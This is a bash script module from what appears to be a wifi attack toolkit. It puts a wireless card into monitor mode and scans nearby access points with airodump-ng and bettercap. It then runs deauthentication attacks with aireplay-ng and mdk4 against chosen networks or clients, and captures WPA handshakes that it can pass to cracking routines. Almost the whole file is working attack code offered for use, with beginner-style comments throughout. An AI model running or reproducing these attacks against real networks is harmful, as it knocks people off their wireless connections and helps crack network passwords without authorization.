#!/bin/bash

wlan_checker () {
        if ! ip link show "$INTER" >/dev/null 2>&1; then  #! — negates the condition [[ this part]], so if wlan0mon does not exist → print error and return.
        err "$INTER not found — Enable it First"
        return 1
		fi
}


cleanup () {
	
	if ! ip link show "$INTERFACE" >/dev/null 2>&1; then  #! — negates the condition [[ this part]], so if wlan0mon does not exist → print error and return.
        info "$INTERFACE is not created"
        return 1
	fi
	
    ip link show "$INTERFACE" >/dev/null 2>&1 && {
    sudo ip link set "$INTERFACE" down 2>/dev/null
    sudo iw dev "$INTERFACE" del 2>/dev/null
    info "Virtual Interface Removed"
	}
}

handshake_check () {
	    
	if ls handshake* >/dev/null 2>&1; then  #ls handshake* 2>/dev/null — lists matching files, suppresses error if none found. grep -q . — returns true if any output exists (at least one file matched).
        rm -f handshake-* 2>/dev/null					#better for this tyoe if [[ -f handshake* ]]; then
    warn "Handshake file removed"
    else 
		warn "No Previous Handshake file"
    fi
	enter
}

mon_checker () {
        if ! ip link show "$INTERFACE" >/dev/null 2>&1; then  #! — negates the condition [[ this part]], so if wlan0mon does not exist → print error and return.
        err "$INTERFACE not found — Create Monitor Mode first"
        enter
        return 1
		fi
}

scan_check () {
	
	if [[ -f /tmp/scan_results.txt ]]; then
		 cat /tmp/scan_results.txt
	else 
		err "Scan file not created try again"
		return 1
	fi
}


create () {

 # ══════════════════════════════════════════════════════
 #Creating Virtual Monitor INTERFACE
 # ══════════════════════════════════════════════════════
	cleanup
	
    info "Creating virtual monitor interface $INTERFACE on $INTER..."
    if 
        sudo iw dev "$INTER" interface add "$INTERFACE" type monitor; then
        sudo ip link set "$INTERFACE" up
        info "$INTERFACE ready"
    else
        err "Could not create $INTERFACE — is $INTER available?"
        err "Check: iw dev"
        return 1
    fi

    enter
}

remove () {

    # ══════════════════════════════════════════════════════
    #Deleting Virtual Monitor if avilable
    # ══════════════════════════════════════════════════════
    cleanup
    
    enter
}

select_interface () {
    # Parse `iw dev` blocks: pair each "Interface X" with its following "type Y"
    mapfile -t WIFI_IFACES < <(
        iw dev | awk '
            /^\s*Interface/ { iface=$2 }
            /^\s*type/      { if (iface != "" && $2 == "managed") print iface; iface="" }
        '
    )

    if [[ ${#WIFI_IFACES[@]} -eq 0 ]]; then
        err "No managed-mode wireless interfaces found."
        err "If you had a monitor interface running from a previous session, clean it up first (option 2)."
        return 1
    fi

    info "Available wireless interfaces:"
    local i=1
    for iface in "${WIFI_IFACES[@]}"; do
        printf "${PURPLE}%d) %s${NC}\n" "$i" "$iface"
        ((i++))
    done

    read -rp "$(printf "%sSelect interface (1-${#WIFI_IFACES[@]}): %s" "${PURPLE_DIM}" "${NC}")" pick
    if [[ $pick =~ ^[0-9]+$ ]] && (( pick >= 1 && pick <= ${#WIFI_IFACES[@]} )); then
        INTER="${WIFI_IFACES[$((pick-1))]}"
    else
		read -rp "$(printf "You have selected the range%s %s %sout of range of%s %s%s. Press%s [ENTER] %sfor default selection to%s %s %s" \
        "${PURPLE_DIM}" "$pick" "${NC}" "${PURPLE_DIM}" "${#WIFI_IFACES[@]}" "${NC}" "${PURPLE_DIM}" "${NC}" "${PURPLE_DIM}" "${WIFI_IFACES[0]}" "${NC}")"
        warn "Invalid selection — defaulted to ${WIFI_IFACES[0]}"
        INTER="${WIFI_IFACES[0]}"
    fi

    # Guard: never append "mon" onto something that's already a monitor-style name
    if [[ "$INTER" =~ mon$ ]]; then 
        INTERFACE="$INTER"
    else
        INTERFACE="${INTER}mon"
    fi
    info "Managed: $INTER  |  Monitor: $INTERFACE"
    enter    
    #Here's a function that detects all wireless interfaces via iw dev, lets you pick one if there's more than one, and sets $INTER (and derives $INTERFACE as its monitor-mode name dynamically instead of hardcoding wlan0mon):
}

wifi_deauth () {

 if [[ -z $ap ]]; then
         err "Run Target Scan First"
 else
    
    printf "%s%s Starting... %s\n" "${PURPLE}" "${BOLD}" "${NC}"
    
    mon_checker || return 1
    sudo iw dev "$INTERFACE" set channel "$ch"
    # xterm=open new terminal,,,-e = to run command in terminal,,,& — run in background so your main script continues;;;; bash — after the command finishes (or errors), drops rel a bash shell keeping the window open so you can see the output/error.
    #read -rp expects a string as the prompt, not a command. So you use $() to convert the printf output rel a string first.
    
    #-z = zero length (empty)
    #-n = non zero length (has data)
    #rempve bash and exit if any error occur in xterm terminal
    
    while true; do

        clear
        status_banner
        echo -e ""
		info "-----Make Choice-----"
		rel "1) Aireplay Attack"
		rel "2) MDK4 Attack (No Client Mac Needed)"
		buck "0) Back"
		warn "Press Ctrl+C here to stop"
    
		userask
		
		case $choice in 
		
			1) while true; do
                info "You can get Client MAC by Bettercap Scan"
                read -rp "$(printf "%sDeauth client  (Enter MAC of client. For all leave empty.): %s\t" "${BLUE_DIM}" "${NC}" )" cp
                if [[ -n $cp ]]; then
                    if [[ $cp =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
                        break
                    else
                        err "Invalid MAC — expected format AA:BB:CC:DD:EE:FF"
                    fi
                else
                    break
                fi
                
                done
				while true; do
			    read -rp "$(printf "%sDeauth Packets Numbers(0 for infinite): %s\t" "${BLUE_DIM}" "${NC}")" pac
				if [[ -z $pac || ! $pac =~ ^[0-9]+$ ]]; then
					err "Number of packets is not selected or wrong selected"
				else 
					break
				fi
				done
				aireplay_deauth
				;;
			
			2) mdk4_deauth ;;
			
			0) break ;;
				
			*) error ;;	
		esac
    done
    
 fi
    enter
}

wifi_handshake () {

 if [[ -z $ap ]]; then
        err "Run Target Scan First"
 else

    printf "%s Capturing... %s\n " "${PURPLE}" "${NC}"
    
 handshake_check    

    #-w handshake — save capture to handshake-01.cap,,,--output-format pcap — save as pcap format (needed for cracking later)
    mon_checker || return 1
    while true; do
    info "You can get Client MAC by Bettercap Scan"
    read -rp "$(printf "%sDeauth client  (Enter MAC of client or For all leave empty): %s\t" "${MAGENTA}" "${NC}")" cp
    if [[ -z "$cp" ]]; then
        break
    elif [[ $cp =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
        break
    else   
        err "Invalid MAC — expected format AA:BB:CC:DD:EE:FF"
    fi
    done
    
    sudo iw dev "$INTERFACE" set channel "$ch"

    while true; do
    clear
    status_banner
    echo -e ""
    ask "1) Aireplay (Deauth:- 20; Airodump:- 40)"
    ask "2) MDK4 (Best) (Deauth:- 25; Airodump:- 40)"
    ask "0) Back "
    warn "Please Dont Press Ctrl+C here"
    userask

	case $choice in
    
		1) if [[ -z $cp ]]; then
				scan_handshake
        		break
    		else
				scan_handshake1
        		break
    		fi ;;

		2)	mdk4_handshake
    		break
    		;;
		
		0) return 0 ;;

	*)error ;;
    esac
    done

    read -rp "$(printf "%sPress Enter to verify handshake...%s" "${MAGENTA}" "${NC}")"
    
    if 
        aircrack-ng handshake* 2>&1 | grep -q "1 handshake"; then
        info "Handshake captured successfully!"
        info "For cracking process type (crack) or press [ENTER]"
        userask
        if [[ $choice = "crack" ]]; then
                echo -e ""
				file="handshake-01.cap"
				cap_run
				way_crack
		fi
    else
        err "No handshake found — try again"
        err "No Handshake Found Removing File 'handshake-01.cap'"
        enter
		rm handshake*
	fi
   fi  
    enter
 #grep -q "1 handshake" — silently checks if the output contains that string, returns true/false.
}

#wifi_pmkid () {
 #   printf "%s PMKID tool not available...%s\n" "${ORANGE_DIM}" "${NC}"
 #    printf "${PURPLE} PMKID Capturing... ${NC}\n"

 # ══════════════════════════════════════════════════════
 #Deleting and creating new wlan1
 # ══════════════════════════════════════════════════════
 #   printf "${RED}Deleting monitor interface $INTERFACE... ${NC}"
 #    ip link show "$INTERFACE" >/dev/null 2>&1 && {
 #   sudo ip link set "$INTERFACE" down 2>/dev/null
  #  sudo iw dev "$INTERFACE" del 2>/dev/null
   # }

    #printf "${MAGENTA}Creating interface $INTERFA.....${NC}\n"
    #if 
    #    sudo iw dev "$INTER" interface add "$INTERFA" type managed; then
    #    sudo ip link set "$INTERFA" up
    #    sudo nmcli dev set $INTERFA managed no  # ← tell NM(Network Manager) to leave wlan1 alone
    #    echo -e "${GREEN}$INTERFA ready ${NC}"
    #else
    #    printf "${RED}Could not create $INTERFA — is $INTER available? ${NC}"
    #    printf "${RED}Check: iw dev ${NC}"
    #   return 1
    #fi

 #--filterlist_ap=$ap — target only your AP;;;--filtermode=2 — whitelist mode (only capture specified AP);;;-w pmkid.pcapng — save output file
    #xterm -bg black -fg cyan -title "PMKID Capture" -e "hcxdumptool -i ${INTERFA} -c ${ch}a -w pmkid.pcapng --exitoneapol=1; bash" &
 #enter
#}


wifi_scan () {

    mon_checker || return 1
    rm -f scan-* 2>/dev/null
  while true; do 
    clear
    status_banner
    echo -e ""
    info "If you select [NO] in bettercap scan and fill correct [IP of client or gateway] you will get extra menu."
    rel "1) Airodump-ng(Data will be autoselected)"
    rel "2) Bettercap(Should be connected to the Network & Data may have to be fill manually)"
    buck "0) Back"
    userask

 #    ip link show "$INTERFA" >/dev/null 2>&1 && { #Deletes wlan1 if avilable for only pmkid
 #    sudo ip link set "$INTERFA" down 2>/dev/null
 #    sudo iw dev "$INTERFA" del 2>/dev/null
 #    }
    case $choice in

    1)
		scan_airodump
    	info "Scan Finished"

 # ══════════════════════════════════════════════════════
 #Selection Part
 # ══════════════════════════════════════════════════════
    if [[ ! -f scan-01.csv ]]; then 
        err "File scan-01.csv couldn't be generated, please retry"
        enter
        return 1
    fi

	python3 "$SCRIPT_DIR/modules/parse_scan.py" scan-01.csv > /tmp/scan_results.txt

	scan_check

 # It was weak so instead placed with python
 #-F',' is setting seperator as comma and become colomn,,NR-numberline and >2 means leave these 2 lines,,$4 !~ /-/ — skip any line where column 4 contains a -,,,count ++ create numbers and extra + is to add one 
 #sed 's/\x1b\[[0-9;]*m//g' — strips all color escape codes before saving to the file, so $ap and $ch are clean when extracted.;;;%d — prints the number,,%s — prints the field value,,\033[1;31m — RED color (same as your $RED variable, but awk can't use bash variables directly),,, >  /tmp/scan_results.txt saves the output data and from where the read selectionis done
   #	cat /tmp/scan_results.txt

    if [[ "$(wc -l < /tmp/scan_results.txt)" = 0 ]]; then 
        err "Proper scan not done or pressed ctrl+c in the small terminal"
        read -rp "$(printf "%s Press [ENTER] to continue%s" "${YELLOW_DIM}" "${NC}")"
        return 1
    fi

    while true; do
    read -rp "$(printf "%s%s Select target (1-$(wc -l < /tmp/scan_results.txt)) (For [Scan Again] chose 0): %s" "${PURPLE}" "${BOLD}" "${NC}")" PICK #(wc -l < /tmp/scan_results.txt)this part tell the output terminal how many bssid are available
    #-gt → >
    #-ge → >=
    #-lt → <
    #-le → <=
    #-eq → =
    #-ne → ≠
	
    if [[ $PICK = 0 ]]; then
        wifi_scan
        return $?
    fi

	if [[ -n $PICK && $PICK =~ ^[0-9]+$ && $PICK -le $(wc -l < /tmp/scan_results.txt) ]]; then
		info "BSSID No Picked $PICK"
        break
	else
		err "Please choose between 1 to $(wc -l < /tmp/scan_results.txt) only"
		read -rp "$(printf "%sPress [Enter] key to continue...%s" "${GREEN_DIM}" "${NC}")"
	fi
	done
	IFS=',' read -r ap ch <<< "$(python3 "$SCRIPT_DIR/modules/pick_ap.py" /tmp/scan_results.txt "$PICK")"
	

 # ══════════════════════════════════════════════════════
 #checking Part
 # ══════════════════════════════════════════════════════

    if [[ -n $ap && -n $ch ]]; then
        info "AP Selection Successful"
        info "Channel Selection Successful"
    else
        err "AP Selection Failed"
        err "Channel Selection Failed"
		return 1
    fi

    read -rp "$(ask "${BOLD}Is the autoslected data correct (Yes/No)")" choice

    choice=$(echo "$choice" | tr '[:upper:]' '[:lower:]' | tr -d ' ')
    if [[ $choice = no ]];then
        while true; do
            read -rp "$(printf "%sSelect the AP MAC%s\t" "${BLUE_DIM}" "${NC}")" ap
            if [[ $ap =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
                break
            else
                err "Invalid MAC — expected format AA:BB:CC:DD:EE:FF"
            fi
        done

        while true; do
            read -rp "$(printf "%sSelect the Channel of the AP%s\t" "${BLUE_DIM}" "${NC}")" ch
            if [[ $ch =~ ^[0-9]+$ ]] && (( ch >= 1 && ch <= 165 )); then
                break
            else
                err "Invalid channel — enter a number between 1 and 165"
            fi
        done
       fi

    rm /tmp/scan_results.txt 2>/dev/null 
    enter
    break   ;;

    2) 	while true; do
        warn "Don't press Ctrl + C here"
        read -rp "$(printf "%s Scanning Time... %s\t" "${BLUE_DIM}" "${NC}")" sec	
        if [[ -z $sec || $sec -ge 60  || ! $sec =~ ^[0-9]+$ || $sec -eq 0 ]]; then
    		warn "Scan time must be a number greater than 0 and less then 60 sec"
		    enter
	    else 
            break
        fi
        done
	    
        sudo bettercap -iface "$INTER" -eval "wifi.recon on; net.recon on; net.probe on; sleep $sec; net.show; wifi.show; exit" 2>/dev/null | tee bettercap_scan.txt
        
        if [[ ! -f bettercap_scan.txt ]]; then 
            err "File bettercap_scan.txt couldn't be generated, please retry"
            enter
            return 1
        fi
        info "Scan Finished"

        python3 "$SCRIPT_DIR/modules/parse_scan.py" bettercap_scan.txt > /tmp/scan_results.txt
        scan_check

    if [[ "$(wc -l < /tmp/scan_results.txt)" = 0 ]]; then 
        err "Proper scan not done or pressed ctrl+c in the small terminal"
        enter
        return 1
    fi

    while true; do
    read -rp "$(printf "%s%s Select target (1-$(wc -l < /tmp/scan_results.txt)) (For [Scan Again] chose 0): %s" "${PURPLE}" "${BOLD}" "${NC}")" PICK #(wc -l < /tmp/scan_results.txt)this part tell the output terminal how many bssid are available

    if [[ $PICK = 0 ]]; then
        wifi_scan
        return $?
    fi

	if [[ -n $PICK && $PICK =~ ^[0-9]+$ && $PICK -le $(wc -l < /tmp/scan_results.txt) ]]; then
		info "BSSID No Picked $PICK"
        break
	else
		err "Please choose between 1 to $(wc -l < /tmp/scan_results.txt) only"
		read -rp "$(printf "%sPress [Enter] key to continue...%s" "${GREEN_DIM}" "${NC}")"
	fi
	done
	IFS=',' read -r ap ch <<< "$(python3 "$SCRIPT_DIR/modules/pick_ap.py" /tmp/scan_results.txt "$PICK")"
	
    info "GATEWAY: $GATEWAY"

    read -rp "$(ask "${BOLD}Is the autoslected data correct (Yes/No)")" choice

    choice=$(echo "$choice" | tr '[:upper:]' '[:lower:]' | tr -d ' ')
    if [[ $choice = no ]];then
        while true; do
            read -rp "$(printf "%sSelect the AP MAC%s\t" "${BLUE_DIM}" "${NC}")" ap
            if [[ $ap =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
                break
            else
                err "Invalid MAC — expected format AA:BB:CC:DD:EE:FF"
            fi
        done

        read -rp "$(printf "%sSelect the IP of MAC or Press [ENTER] (If not want nmap scans.)%s\t" "${BLUE_DIM}" "${NC}")" IP
        if [[ -n $IP ]];then
            if [[ ! $IP =~ ^(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])\.(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])\.(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])\.(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])$ ]]; then
				err "Invalid IP — expected format like 192.168.1.1 (no CIDR)"
    		fi
                    if [[ $IP = "$GATEWAY" ]]; then
                        info "IP Matched to the gateway"
                        rel "47) NMAP-Network Scan (or Press [ENTER])"
                        userask
                        if [[ $choice = 47 ]]; then
                            network #yet to be called
                        fi
                    else    
                        info "IP didn't match the gateway"
                        rel "102) NMAP-Other Scan (or Press [ENTER])"
                        userask
                        if [[ $choice = 102 ]]; then
                            other #yet to be called
                        fi
                    fi
        fi
		
        while true; do
            read -rp "$(printf "%sSelect the Channel of the AP%s\t" "${BLUE_DIM}" "${NC}")" ch
            if [[ $ch =~ ^[0-9]+$ ]] && (( ch >= 1 && ch <= 165 )); then
                break
            else
                err "Invalid channel — enter a number between 1 and 165"
            fi
        done
    fi

    if [[ -n $ap && -n $ch ]]; then
        info "AP Selection Successful"
        info "Channel Selection Successful"
    else
        err "AP Selection Failed"
        err "Channel Selection Failed"
		return 1
    fi
       rm /tmp/scan_results.txt 2>/dev/null 
        enter
    
        break;;
    
    *) error ;;
esac
done
}


wifi_attack_menu() {

    while true; do
    clear
    status_banner
    banner "══════════════════════════════════════════════════════"
    banner "${BOLD}               ATTACK             "
    banner "══════════════════════════════════════════════════════"
    relnext "4) Deauth Attack"
    relnext "5) Handshake capture"
    buck "0) Back"

    userask

    case $choice in
    4) wifi_deauth;;
    5) wifi_handshake;;
    0) break ;;
    *) error;;
    esac
    done
}
wifi_main_menu () {
    while true; do
    clear
    status_banner
    print_wifi
    echo -e ""
    banner "════════════════════════════════════════════════════"
    banner "${BOLD}              RECONNAISSANCE             "
    banner "══════════════════════════════════════════════════════"

    rel "1) Switch to monitor mode"
    rel "2) Swith to managed mode"
    rel "3) Target scan"
    buck "0) Back"

    userask

    case $choice in 
    
        1) wlan_checker && create;;
        2) remove;;
        3) wifi_scan && wifi_attack_menu;;
        0) return 0;;
        *) error;;
    esac
    done
}
